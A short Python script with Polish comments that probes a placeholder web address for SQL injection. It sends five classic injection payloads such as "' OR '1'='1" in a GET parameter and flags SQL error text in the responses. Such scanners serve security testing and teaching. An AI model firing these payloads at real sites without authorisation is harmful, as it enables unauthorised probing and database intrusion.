# SKRYP SPRAWDZAJĄCY APLIKACJĘ WEBOWĄ POD KĄTEM PODATNOŚCI NA ATAKI SQL INJECTION

# importujemy biblioteke która pozwala na wysyłanie zapytań HTTP
import requests

# wybieramy adres strony, którą sprawdzimy
url = "adres_strony"

# znaki które symulują ataki SQL -> modyfikują zapytania SQL
payloads = ["' OR '1'='1", "' OR '1'='1' -- ", "' OR 1=1#", "\" OR \"1\"=\"1", "';--"]

# pętla przechodząca przez każdy payload i robi na niego atak
for payload in payloads:
    params = {"query": payload}
    # wysyłanie zapytania GET
    response = requests.get(url, params=params)
    # wypisanie odpowiedzi HTTP
    print(f"Payload: {payload} | Status: {response.status_code}")
    # jeśli wykryto podatność skrypt zwraca informacje
    if "SQL" in response.text or "syntax" in response.text or "mysql" in response.text.lower():
        print("Możliwa podatność SQL Injection!")